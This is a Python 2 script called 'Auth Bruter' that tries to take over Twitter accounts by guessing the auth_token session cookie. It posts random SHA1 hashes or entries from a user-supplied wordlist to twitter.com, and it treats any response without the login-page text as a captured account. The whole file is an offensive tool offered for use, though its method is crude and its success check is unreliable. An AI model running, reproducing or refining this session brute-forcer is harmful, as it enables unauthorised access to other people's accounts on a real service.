#!/usr/bin/env python
#Max Convinations: 178689910246017054531432477289437798228285773001601743140683776
import requests, re, random, hashlib
global Finished

def bruteForce():
    #Key word: "Welcome to Twitter - Login or Sign up"
    Finished = False
    while (Finished == False):
        data = "Welcome to Twitter - Login or Sign up" #Data to determinate if I'm in the Welcome Page
        data_aux = "Log in to Twitter" #Data to determinate if I'm in the Welcome Page
        first_data = re.compile(data)
        second_data = re.compile(data_aux)
        hash = hashlib.sha1(str(random.random())).hexdigest() #Generate a Random Sha1 Hash
        print "Hash Value: %s" % hash
        cookie = {'auth_token' : 'default' , 'lang' : 'en'} #Dictionary of Cookies
        cookie['auth_token'] = str(hash) #Give a value to the auth_token
        r = requests.post('https://www.twitter.com', cookies=cookie) #Request for a page with this cookies
        result = re.search(first_data, r.text) #Search if is the Welcome Page
        if (result == None): #If I'm not in Welcome page
           aux_result = re.search(second_data, r.text)
           if (aux_result == None): #If I'm not in Welcome page
               print "Here we found a Hash!" #I'm a Home page :)
               print "Account Hash: %s" % hash
               Finished = True
               break
           else: #I'm on the Welcome page
               print "Nothing Found"
        else: #I'm on the Welcome page
           print "Nothing Found"
    return

def dicAttack():
    Finished = False
    while (Finished == False):
        data = "Welcome to Twitter - Login or Sign up" #Data to determinate if I'm in the Welcome Page
        data_aux = "Log in to Twitter" #Data to determinate if I'm in the Welcome Page
        first_data = re.compile(data)
        second_data = re.compile(data_aux)
        chose = str(raw_input("Enter the path of the dic: "))
        file = open(chose, "r+").read().split('\n') #Eliminate the "New Line" in file
        for line in file:
            print "Hash Value: %s" % line #Select a Hash from dic
            cookie = {'auth_token' : 'default' , 'lang' : 'en'} #Dictionary of Cookies
            cookie['auth_token'] = str(line) #Give a value to the auth_token
            r = requests.post('https://www.twitter.com', cookies=cookie) #Request for a page with this cookies
            result = re.search(first_data, r.text)
            if (result == None): #If I'm not in Welcome page
               aux_result = re.search(second_data, r.text)
               if (aux_result == None): #If I'm not in Welcome page
                   print "Here we found a Hash!" #I'm a Home page :)
                   print "Account Hash: %s" % line
                   Finished = True
                   break
               else: #I'm on the Welcome page
                   print "Nothing Found"
            else:  #I'm on the Welcome page
               print "Nothing Found"
    return

def main():
    Finished = False
    print '''

    ___           __   __       ____                __             
   /   |  __  __ / /_ / /_     / __ ) _____ __  __ / /_ ___   _____
  / /| | / / / // __// __ \   / __  |/ ___// / / // __// _ \ / ___/
 / ___ |/ /_/ // /_ / / / /  / /_/ // /   / /_/ // /_ /  __// /    
/_/  |_|\__,_/ \__//_/ /_/  /_____//_/    \__,_/ \__/ \___//_/     
                                                                                                                                                                                                                                                                         
                                                    By Franc205

Please chose an option:
1. Use Brute Force.
2. Use a Dictionary.
3. Exit.
    '''
    chose = int(raw_input("Enter your option: "))
    if (chose == 1):
        bruteForce()
    elif (chose == 2):
        dicAttack()
    elif (chose == 3):
        exit()
    else:
        print("You haven't chose a valid option")
        main()
    return

main()
